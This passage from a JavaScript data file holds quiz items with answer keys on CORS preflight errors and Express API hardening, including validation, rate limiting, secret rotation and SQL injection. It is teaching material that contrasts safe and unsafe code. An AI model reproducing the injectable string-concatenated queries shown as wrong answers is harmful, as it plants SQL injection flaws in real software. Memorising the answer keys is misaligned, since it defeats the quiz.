    answer: 1,
    why: 'Simple requests are sent first and checked afterwards. That is why state-changing routes must be protected on the server (auth), not by CORS.' },
  { type: 'mc', topic: 'cors',
    q: 'Chrome says: "Request header field authorization is not allowed by Access-Control-Allow-Headers in preflight response." The server has `allowedHeaders: [\'Content-Type\']`. What is the fix?',
    choices: ['Remove the `Authorization` header from every request', 'Add `\'Authorization\'` to `allowedHeaders` (or leave `allowedHeaders` unset so cors echoes the requested headers)', 'Add `Access-Control-Allow-Headers` to the fetch request', 'Switch the method to GET'],
    answer: 1,
    why: 'The preflight asked to send `authorization` and the answer did not list it. The server must allow it; the front end cannot grant itself permission.' },

  /* Hardening the API */
  { type: 'mc', topic: 'hardening',
    q: 'A `validate` middleware calls `taskSchema.safeParse(req.body)` and gets `success: false`. What should it do?',
    choices: ['Throws, so the error handler answers 500', 'Answers 400 with `error.issues` and does not call the controller', 'Calls `next()` and lets the model reject it', 'Answers 201 with the corrected data'],
    answer: 1,
    why: '`safeParse` never throws; the middleware turns a failure into **400** with the list of issues, so malformed bodies never reach the controller.' },
  { type: 'tf', topic: 'hardening',
    q: 'If the front-end form already validates every field, the API does not need to validate `req.body` again.',
    answer: false,
    why: 'Anyone can bypass your form with curl or a script. Front-end checks are a convenience; the server must validate everything that arrives.' },
  { type: 'mc', topic: 'hardening',
    q: 'A client sends `{"title":"Buy milk","userId":99}` to a `POST /tasks` protected by a Zod `validate` middleware (title required, `done` defaults to false). What is in `req.body` after the middleware?',
    choices: ['`{ title: \'Buy milk\', userId: 99 }`', '`{ title: \'Buy milk\', done: false }`: unknown keys stripped, default applied', 'Nothing: the request is rejected with 400 because of `userId`', '`{ userId: 99 }`'],
    answer: 1,
    why: 'Zod object schemas strip unknown keys by default and apply `.default(false)`, and `validate` replaces `req.body` with the parsed data. The owner then comes from the token.' },
  { type: 'mc', topic: 'hardening',
    q: 'An API clamps `page ≥ 1` and `1 ≤ limit ≤ 100`. What does `GET /tasks?page=0&limit=999` use?',
    choices: ['page 0, limit 999', 'page 1, limit 100', 'page 1, limit 20', 'It answers 400'],
    answer: 1,
    why: 'Clamping to `page ≥ 1` and `1 ≤ limit ≤ 100` means `page=0` becomes 1 and `limit=999` becomes 100.' },
  { type: 'mc', topic: 'hardening',
    q: 'A tutorial computes `const limit = Math.min(100, Number(req.query.limit) || 20);`. What is `limit` for `?limit=-5`?',
    choices: ['20', '1', '-5', '100'],
    answer: 2,
    why: '`Number(\'-5\')` is `-5`, which is truthy, and `Math.min(100, -5)` is `-5`. There is no lower bound; add `Math.max(1, …)`.' },
  { type: 'fib', topic: 'hardening',
    q: 'When a client exceeds express-rate-limit\'s limit, the API answers with status code ___ (Too Many Requests).',
    accept: ['429'],
    why: '429 Too Many Requests. A strict limiter on `/auth/login` makes password guessing impractical.' },
  { type: 'mc', topic: 'hardening',
    q: 'Your `JWT_SECRET` was committed to a public repository last week. What is the right response?',
    choices: ['Delete the line in a new commit; the problem is solved', 'Make the repository private; nothing else is needed', 'Generate a new secret, set it in the environment and remove it from the code: every old token stops working', 'Nothing: the secret is useless without the database'],
    answer: 2,
    why: 'Anyone with the secret can sign tokens for any user. Git history keeps the old value, so the only fix is **rotation**; users simply log in again.' },
  { type: 'mc', topic: 'hardening',
    q: 'Which code is safe against SQL injection?',
    choices: ['`db.query("SELECT * FROM users WHERE email = \'" + email + "\'")`', 'A template literal that inserts `${email}` into the SQL text', '`db.query(\'SELECT * FROM users WHERE email = $1\', [email])`', '`db.query(\'SELECT * FROM users WHERE email = \' + escape(email))`'],
    answer: 2,
    why: 'A parameterised query sends the value separately from the SQL text, so it can never be run as SQL. Concatenation and template literals both build SQL from user input.' },
  { type: 'tf', topic: 'hardening',
    q: '`express.json()` already rejects bodies larger than 100 kB by default, so `express.json({ limit: \'100kb\' })` changes nothing.',
    answer: true,
    why: 'The body parser\'s default limit is 100kb (it answers 413 above it). Writing the limit makes it visible; the real mistake would be raising it carelessly.' },
  { type: 'mc', topic: 'hardening',
    q: 'What does `app.use(helmet())` add to an Express API?',
    choices: ['Password hashing for every route', 'Protective HTTP response headers (nosniff, CSP, HSTS, frame options) and removal of `X-Powered-By`', 'An ownership check for every resource', 'Automatic input validation'],
    answer: 1,
    why: 'helmet only sets headers. It is useful, but it does nothing for access control, validation or secrets.' },
];
